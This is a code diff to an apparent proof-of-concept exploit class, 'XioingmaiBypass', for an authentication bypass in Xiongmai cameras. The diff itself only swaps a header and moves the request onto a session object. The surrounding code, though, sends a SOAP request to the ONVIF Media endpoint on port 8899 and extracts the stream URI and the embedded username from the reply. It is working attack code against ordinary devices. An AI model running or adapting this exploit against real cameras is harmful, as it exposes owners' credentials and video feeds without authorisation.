@@ -17,7 +17,7 @@ class XioingmaiBypass(POCTemplate):
         self.desc = 'Xiongmai authentication bypass'
 
     def verify(self, ip, port=80):
-        headers = {'Connection': 'close', 'User-Agent': self.config.user_agent}
+        headers = {'User-Agent': self.config.user_agent}
         url = f"http://{ip}:8899/onvif/Media"
         headers = {
             "Content-Type": "application/soap+xml; charset=utf-8",
@@ -45,7 +45,7 @@ class XioingmaiBypass(POCTemplate):
         </soap:Envelope>
         """
         try:
-            r = requests.post(url, headers=headers, data=xml_payload, verify=False, timeout=self.config.timeout)
+            r = self.session.post(url, headers=headers, data=xml_payload, verify=False, timeout=self.config.timeout)
             if match := re.search(r'<tt:Uri>(.*?)</tt:Uri>', r.text):
                 link = match.group(1).replace("&amp;", "&")
                 user = re.findall('user=(.*)&', link)
